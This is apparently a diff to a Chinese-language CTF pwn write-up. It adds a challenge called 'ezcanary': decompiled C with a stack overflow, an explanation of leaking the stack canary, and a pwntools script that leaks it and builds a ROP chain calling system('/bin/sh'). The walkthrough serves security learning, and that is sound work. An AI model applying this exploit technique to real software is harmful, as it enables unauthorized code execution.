@@ -400,7 +400,71 @@ io.sendline('8227')
 io.interactive()
 ```
 
+### [Week2] ezcanary
 
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+Fh] [rbp-21h]
+  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
+  unsigned __int64 v6; // [rsp+28h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  bufinit(argc, argv, envp);
+  puts("Ur name plz?");
+  read(0, buf, 0x100uLL);
+  printf("Hello, %s. Is that right?", buf);
+  v4 = getchar();
+  if ( v4 == 121 || v4 == 89 )
+  {
+    puts("Then new name plz.");
+    read(0, buf, 0x100uLL);
+    printf("Hello, %s.", buf);
+  }
+  puts("Wish you a wonderful day. Bye.");
+  return 0;
+}
+```
+
+题目开启了 Canary 保护，并且提供了后门函数。 
+
+Canary 保护在进入函数时会在 ebp 前方添加一个 8 字节的随机数，当程序将要返回时，会比对随机数是否发生改变。如果发生了改变，说明被栈溢出修改了 retn 地址，从而结束进程，保护程序。为了防止 Canary 被意外输出，随机数的最低位始终是 `\0`。因此，如果程序存在一次可以写入后读取的操作，就可以一直覆盖到 Canary 的第一个 `\0`，从而得到 Canary 值，进行栈溢出。
+
+| Stack  |
+| ------ |
+| ...    |
+| canary |
+| ebp    |
+| ...    |
+
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+io = process('./pwn')
+elf = ELF('./pwn')
+
+rdi = 0x40138B
+
+io.recvuntil('plz?')
+io.send(b'a'*0x19)
+io.recvuntil(b'a'*0x19)  # 覆盖到 canary 的第一个字节
+canary = b'\0'+io.recv(7)  # canary 的第一个字节一定是 \0
+payload = flat([
+    b'a'*0x18,
+    canary,
+    0,
+    rdi+1,  # retn 用于栈对齐
+    rdi,
+    elf.search(b'/bin/sh').__next__(),
+    elf.plt.system
+])
+io.recvuntil('right?')
+io.send('y')
+io.recvuntil('plz.')
+io.send(payload)
+io.interactive()
+
+```
 
 ### [Week3] all-in-files
 
